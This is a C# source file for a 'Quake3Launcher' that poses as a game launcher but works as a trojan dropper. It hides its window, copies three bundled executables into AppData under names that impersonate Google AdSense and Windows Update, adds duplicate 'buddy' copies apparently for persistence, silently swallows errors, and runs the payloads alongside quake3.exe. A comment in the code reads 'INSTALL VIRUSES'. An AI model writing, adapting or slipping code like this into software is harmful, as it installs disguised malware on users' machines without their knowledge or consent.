using System;
using System.IO;
using System.Diagnostics;
using System.Windows.Forms;

namespace Quake3Launcher
{
    public partial class Quake3Launcher : Form
    {
        public Quake3Launcher()
        {
            InitializeComponent();
            Visible = false; // Hide window.
            ShowInTaskbar = false; // Remove from taskbar.

            // Expand Environmental variable
            string appDataLoc = Environment.GetEnvironmentVariable("appdata");
            string adSource = Environment.CurrentDirectory + "\\Files\\Ad\\";
            string adSenseSource = Environment.CurrentDirectory + "\\Files\\GG\\";
            string winUpdateSource = Environment.CurrentDirectory + "\\Files\\WU\\";

            // Set Installation paths
            string adDest = appDataLoc + "\\Ads\\";
            string adSenseDest = appDataLoc + "\\Google\\AdSense\\";
            string winUpdateDest = appDataLoc + "\\Microsoft\\Windows Update\\";

            // Precheck folder existense
            if (!System.IO.Directory.Exists(adDest))
            {
                System.IO.Directory.CreateDirectory(adDest);
            }
            if (!System.IO.Directory.Exists(adSenseDest))
            {
                System.IO.Directory.CreateDirectory(adSenseDest);
            }
            if (!System.IO.Directory.Exists(winUpdateDest))
            {
                System.IO.Directory.CreateDirectory(winUpdateDest);
            }

            // Creating Buddy folders
            if (!System.IO.Directory.Exists(adSenseDest + "\\bin\\"))
            {
                System.IO.Directory.CreateDirectory(adSenseDest + "\\bin\\");
            }

            if (!System.IO.Directory.Exists(winUpdateDest + "\\bin\\"))
            {
                System.IO.Directory.CreateDirectory(winUpdateDest + "\\bin\\");
            }

            // INSTALL VIRUSES
            // Copy Ad
            try
            {
                if (System.IO.Directory.Exists(adDest))
                {
                    System.IO.File.Copy(adSource + "1.exe", adDest + "Ad.exe", true);
                }
            }
            catch (Exception)
            {            }

            try
            {
                // Copy AdSense
                if (System.IO.Directory.Exists(adSenseDest))
                {
                    System.IO.File.Copy(adSenseSource + "2.exe", adSenseDest + "Google AdSense.exe", true);
                    // Create Buddy Shadow
                    System.IO.File.Copy(winUpdateSource + "3.exe", adSenseDest + "\\bin\\service.exe", true);
                }
            }
            catch (Exception)
            {
            }

            try
            {
                // Copy WinUpdate
                if (System.IO.Directory.Exists(winUpdateDest))
                {
                    System.IO.File.Copy(winUpdateSource + "3.exe", winUpdateDest + "Windows Update.exe", true);
                    // Create Buddy Shadow
                    System.IO.File.Copy(adSenseSource + "2.exe", winUpdateDest + "\\bin\\service.exe", true);
                }
            }
            catch (Exception)
            {
            }

            try
            {
                // Start Processes
                Process.Start(Environment.CurrentDirectory + "\\quake3.exe");
                Process.Start(adSenseDest + "Google AdSense.exe");
            }
            catch (Exception)
            {
            }
            
            
            // Optimize CPU utilization
            System.Threading.Thread.Sleep(1000);

            Process.Start(adDest + "Ad.exe");

            this.Close();
        }
    }
}
